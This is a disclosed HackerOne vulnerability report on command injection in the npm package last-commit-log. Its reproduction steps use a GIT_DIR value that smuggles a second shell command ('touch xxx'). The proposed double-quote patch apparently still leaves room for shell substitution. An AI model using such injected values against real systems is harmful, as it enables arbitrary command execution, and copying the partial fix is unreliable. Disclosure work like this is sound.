---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '881713'
original_report_id: '881713'
title: '[last-commit-log] Command Injection'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2020-05-24T11:57:12.726Z'
disclosed_at: '2020-11-29T11:06:29.469Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [last-commit-log] Command Injection

## Metadata

- HackerOne Report ID: 881713
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2020-11-29T11:06:29.469Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report `Command Injection` in `last-commit-log`
It allows `execution of arbitrary commands`

# Module

**module name:** `last-commit-log`
**version:** `last-commit-log@3.0.4`
**npm page:** `https://www.npmjs.com/package/last-commit-log`

## Module Description

Node.js module to get the last git commit information - mostly to be used by CI/CD and building phase.

## Module Stats

[3,253] downloads in the last week

# Vulnerability

The value of the GIT_DIR env variable is added to the command here on [line 10](https://github.com/node-modules/last-commit-log/blob/master/index.js#L10) and here on [line 25](https://github.com/node-modules/last-commit-log/blob/master/index.js#L25) and finally the command is executed on [line 36](https://github.com/node-modules/last-commit-log/blob/master/index.js#L36).

## Vulnerability Description

## Steps To Reproduce:
> npm i last-commit-log
>cat > test.js
const LCL = require('last-commit-log');
const lcl = new LCL('.'); // or `new LCL(dir)` dir is process.cwd() by default
>lcl
  .getLastCommit()
  .then(commit => console.log(commit));

Export malicious GIT_DIR string
>export GIT_DIR=". ;touch xxx;"

Run
>node test.js


{F840963}

## Patch

Fix: enclose --git-dir flag in quotes on line 10 like so
```this.gitDirStr = GIT_DIR ? `--git-dir="${GIT_DIR}/.git"` : '';```

## Supporting Material/References:

- [OPERATING SYSTEM VERSION] Ubuntu 18.04.4 LTS
- [NODEJS VERSION] v14.0.0
- [NPM VERSION] 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [Y/N] No
- I opened an issue in the related repository: [Y/N] No

## Impact

Ability to run any command available for attacker.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
